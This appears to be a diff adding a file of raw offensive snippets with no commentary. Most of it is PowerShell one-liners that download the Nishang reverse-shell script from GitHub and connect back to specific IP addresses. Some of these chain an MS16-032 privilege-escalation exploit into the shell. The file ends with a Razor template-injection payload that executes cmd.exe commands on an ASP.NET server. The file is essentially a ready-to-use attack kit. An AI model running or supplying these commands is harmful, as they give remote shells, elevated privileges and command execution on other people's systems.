@@ -1,0 +1,49 @@
+powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 12.240.12.69 -port 2333
+
+
+
+powershell IEX (New-Object Net.WebClient).DownloadString('http://xxx.240.xx.69/2.ps1');Invoke-PowerShellTcp -Reverse -IPAddress xxx.240.xx.69 -port 2333
+
+
+powershell -Version 2 -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/intrd/6dda33f61dca560e6996d01c62203374/raw/babf9a6afd23bb17a89bb3415099459db7bd25cf/ms16_032_intrd_mod.ps1');Invoke-MS16-032 \"-NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 210.56.57.75 -Port 12666\" "
+
+
+
+IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/intrd/6dda33f61dca560e6996d01c62203374/raw/babf9a6afd23bb17a89bb3415099459db7bd25cf/ms16_032_intrd_mod.ps1');Invoke-MS16-032 "-NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 210.56.57.75 -Port 12666"
+
+
+
+
+@using System.CodeDom.Compiler;
+@using System.Diagnostics;
+@using System.Reflection;
+@using System.Web.Compilation;
+@functions {
+string ExecuteCommand(string command, string arguments = null)
+{
+var output = new System.Text.StringBuilder();
+var process = new Process();
+var startInfo = new ProcessStartInfo
+{
+FileName = command,
+Arguments = arguments,
+WorkingDirectory = HttpRuntime.AppDomainAppPath,
+RedirectStandardOutput = true,
+RedirectStandardError = true,
+UseShellExecute = false
+};
+process.StartInfo = startInfo;
+process.OutputDataReceived += (sender, args) => output.AppendLine(args.Data);
+process.ErrorDataReceived += (sender, args) => output.AppendLine(args.Data);
+                process.Start();
+process.BeginOutputReadLine();
+process.BeginErrorReadLine();
+process.WaitForExit();
+return output.ToString();
+}
+}
+      @{
+var cmd = ExecuteCommand("cmd.exe", "/c whoami");
+        }
+Output of the injected command (killer):
+@cmd
